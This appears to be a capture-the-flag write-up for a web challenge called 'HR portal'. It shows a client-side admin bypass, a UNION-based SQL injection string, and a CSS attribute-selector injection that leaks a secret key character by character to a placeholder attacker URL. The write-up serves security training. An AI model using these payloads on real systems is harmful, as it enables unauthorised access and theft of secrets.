# [web] HR portal

> **Category:** `web`  
> **CTF:** KubSTU CTF 2026 Spring

### Description 

 Every professional knows: the boss of the company isn't the director — it's HR. They decide your fate and hand you the coveted offer. Explore our new portal and uncover the HR manager's secrets.  


### Writeup


1. Complete registration and log into the portal
2. Look at the JS or the requests

One of the requests is api/user-info, which is responsible for user permissions. But the protection is only implemented on the client side. So it can be bypassed in various ways. 
The simplest is to change the value of is_admin from 0 to 1 in the response.

 ![img_1.png](./images/img_1.png)


 ![img_2.png](./images/img_2.png)


Two new buttons appear.

 ![img_3.png](./images/img_3.png)


In Get Promotion there's a final form for inserting the secret and getting the flag.
Also, in the page source there's a small hint for composing the future CSS payload.


 ![img_4.png](./images/img_4.png)


In the second button, Open Admin Panel, we see a settings search that is vulnerable to SQLi.


 ![img_5.png](./images/img_5.png)


Using SQLi, we extract the attribute value, which we'll also need for composing the CSS injection.

  `' UNION SELECT setting_value FROM admin_settings WHERE setting_name='secret_field_name' -- -`  


 ![img_6.png](./images/img_6.png)



As a result, we get a payload roughly like this:
 
 `.admin-secret-key[data-hr_secret_key_f5g4^="A"] { background-image: url("http://YOUR_URL?char=A" ); }`  


 ![img_7.png](./images/img_7.png)



Then we use the key to get the flag.


 ![img_8.png](./images/img_8.png)


